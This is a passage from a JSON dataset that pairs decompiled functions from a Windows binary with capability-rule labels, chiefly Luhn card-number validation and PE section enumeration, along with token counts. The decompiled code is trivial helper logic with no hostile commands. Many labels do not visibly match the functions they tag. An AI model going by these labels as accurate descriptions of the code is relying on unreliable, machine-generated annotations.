            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004892a9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404921(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "0041e520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041e520(void)\n\n{\n    uint var_4h;\n    \n    return 0x546081;\n}\n",
        "token_count": 29
    },
    "0041e5d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e5d0(uint arg_8h, uint arg_ch)\n\n{\n    uint in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402d42(arg_ch, in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 68
    },
    "004209f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004209f0(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    LOCK();\n    *(param_1 + 4) = *(param_1 + 4) + 1;\n    return;\n}\n",
        "token_count": 56
    },
    "00420a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420a60(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint arg_24h;\n    uint in_ECX;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_10h;\n    \n    arg_24h = fcn.004055b5(&var_50h, 0x40, 0x546518, arg_1ch);\n    fcn.00403c38(in_ECX, arg_8h, arg_ch, noname_2, arg_14h, arg_18h, &var_50h, arg_24h);\n    return arg_8h;\n}\n",
        "token_count": 198
    },
    "00421570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421570(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_56h;\n    uint var_50h;\n    uint var_10h;\n    \n    uVar1 = fcn.004017c1();\n    uVar1 = fcn.00402b08(in_ECX, &var_56h, 0x546746, uVar1);\n    uVar1 = fcn.004055b5(&var_50h, 0x40, uVar1, arg_1ch);\n    fcn.00403c38(in_ECX, arg_8h, arg_ch, noname_2, arg_14h, arg_18h, &var_50h, uVar1);\n    return arg_8h;\n}\n",
        "token_count": 251
    },
    "00421680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421680(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_56h;\n    uint var_50h;\n    uint var_10h;\n    \n    uVar1 = fcn.004017c1();\n    uVar1 = fcn.00402b08(in_ECX, &var_56h, 0x546749, uVar1);\n    uVar1 = fcn.004055b5(&var_50h, 0x40, uVar1, arg_1ch);\n    fcn.00403c38(in_ECX, arg_8h, arg_ch, noname_2, arg_14h, arg_18h, &var_50h, uVar1);\n    return arg_8h;\n}\n",
        "token_count": 251
    },
    "00423300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00423300(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404d9f(&arg_8h, &arg_ch);\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 1) {\n        uVar1 = fcn.00403ba7(*arg_8h, in_ECX + 8);\n        *arg_8h = uVar1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 151
    },
    "00423390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00423390(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    cVar1 = fcn.00403ba7(arg_8h & 0xff, in_ECX + 8);\n    return cVar1;\n}\n",
        "token_count": 78
    },
    "004233d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.004233d0(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404d9f(&arg_8h, &arg_ch);\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 1) {\n        uVar1 = fcn.00404a39(*arg_8h, in_ECX + 8);\n        *arg_8h = uVar1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 152
    },
    "00423460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00423460(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    cVar1 = fcn.00404a39(arg_8h & 0xff, in_ECX + 8);\n    return cVar1;\n}\n",
        "token_count": 78
    },
    "004234a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004234a0(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    \n    fcn.0040441c(&arg_8h, &arg_ch);\n    fcn.00405830(arg_10h, arg_8h, arg_ch - arg_8h);\n    return arg_ch;\n}\n",
        "token_count": 91
    },
    "00423510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00423510(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    return arg_8h;\n}\n",
        "token_count": 35
    },
    "00423530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00423530(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    \n    fcn.0040441c(&arg_8h, &arg_ch);\n    fcn.00405830(arg_14h, arg_8h, arg_ch - arg_8h);\n    return arg_ch;\n}\n",
        "token_count": 96
    },
    "004235a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004235a0(uint arg_8h, uint arg_ch)\n\n{\n    uint var_4h;\n    \n    return arg_8h;\n}\n",
        "token_count": 40
    },
    "004240c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004240c0(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0xc);\n}\n",
        "token_count": 41
    },
    "004240e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004240e0(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0xd);\n}\n",
        "token_count": 41
    },
    "00464280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00464280(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_ch + arg_14h;\n    var_4h = arg_10h + arg_18h + CARRY4(arg_ch, arg_14h);\n    if (((*(in_ECX + 0x4c) != 0) && (cVar1 = fcn.004038fa(),  cVar1 != '\\0')) &&\n       (iVar2 = fcn.00405fc4(*(in_ECX + 0x4c), &var_8h),  iVar2 == 0)) {\n        *(in_ECX + 0x44) = arg_20h;\n        *(in_ECX + 0x40) = arg_1ch;\n        fcn.0040373d();\n        iVar2 = *(in_ECX + 0x44);\n        arg_8h[4] = *(in_ECX + 0x40);\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n        arg_8h[2] = 0;\n        arg_8h[3] = 0;\n        arg_8h[5] = iVar2;\n        return;\n    }\n    *arg_8h = -1;\n    arg_8h[1] = -1;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    arg_8h[5] = 0;\n    return;\n}\n",
        "token_count": 439
    },
    "00465530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465530(uint32_t arg_8h)\n\n{\n    if (arg_8h == 0) {\n        fcn.00404a7f();\n        fcn.00406505(4);\n        return;\n    }\n    fcn.004046a1((arg_8h & 7) * 0x18 + 0x574128);\n    return;\n}\n",
        "token_count": 89
    },
    "00465579": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465579(uint32_t arg_8h)\n\n{\n    if (arg_8h == 0) {\n        fcn.00401ce9(4);\n        return;\n    }\n    fcn.00402090((arg_8h & 7) * 0x18 + 0x574128);\n    return;\n}\n",
        "token_count": 79
    },
    "004663b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004663b6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.00403526(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "00466b07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466b07(uint arg_8h, uint arg_ch)\n\n{\n    uint in_ECX;\n    \n    fcn.00404453(in_ECX, arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 52
    },
    "00402f1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402f1d(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403c9c(arg_8h, arg_8h + 0x16, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 87
    },
    "004037a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004037a1(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0040213f(arg_8h, arg_8h + 0x16, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 85
    },
    "00469b81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00469b81(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.00403c9c(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 62
    },
    "00469ba6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00469ba6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.0040213f(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "0040644c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040644c(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t arg_1ch;\n    int32_t iVar1;\n    int32_t arg_18h_00;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    arg_1ch = arg_ch - arg_8h >> 1;\n    uVar3 = 0xffffffff;\n    uVar2 = arg_14h - arg_10h >> 1;\n    if (arg_18h == 0) {\n        iVar1 = fcn.00403819();\n        iVar1 = *(iVar1 + 4);\n    }\n    else {\n        iVar1 = *(arg_18h + 4);\n    }\n    if (iVar1 == 0) {\n        if (uVar2 <= arg_1ch) {\n            fcn.00405830(arg_8h, arg_10h, uVar2 * 2);\n        }\n    }\n    else {\n        arg_18h_00 = fcn.00401596(arg_1ch);\n        if (arg_18h_00 != 0) {\n            uVar3 = fcn.0040466a(iVar1, 0x400, arg_10h, uVar2, arg_18h_00, arg_1ch);\n            if (uVar3 == 0) {\n                uVar3 = fcn.0040466a(iVar1, 0x400, arg_10h, uVar2, 0, 0);\n                if (uVar3 == 0) {\n                    uVar3 = 0x7fffffff;\n                }\n            }\n            else {\n                uVar2 = 0;\n                if (uVar3 != 0) {\n                    do {\n                        *(arg_8h + uVar2 * 2) = *(uVar2 + arg_18h_00);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < uVar3);\n                }\n            }\n        }\n        fcn.00404179(arg_18h_00);\n        uVar2 = uVar3;\n    }\n    return uVar2;\n}\n",
        "token_count": 517
    },
    "0046af8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046af8c(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.004035b7(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.00404480(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.00403e3b(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.00403e3b(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h);\n            fcn.00401654(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.0040393b();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 426
    },
    "00401253": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401253(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_8h;\n    \n    puVar2 = fcn.00406947(&var_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    uVar1 = puVar2[1];\n    *arg_8h = *puVar2;\n    arg_8h[1] = uVar1;\n    return;\n}\n",
        "token_count": 136
    },
    "00405fa1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405fa1(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_8h;\n    \n    puVar2 = fcn.00406294(&var_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    uVar1 = puVar2[1];\n    *arg_8h = *puVar2;\n    arg_8h[1] = uVar1;\n    return;\n}\n",
        "token_count": 137
    },
    "0046e26c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
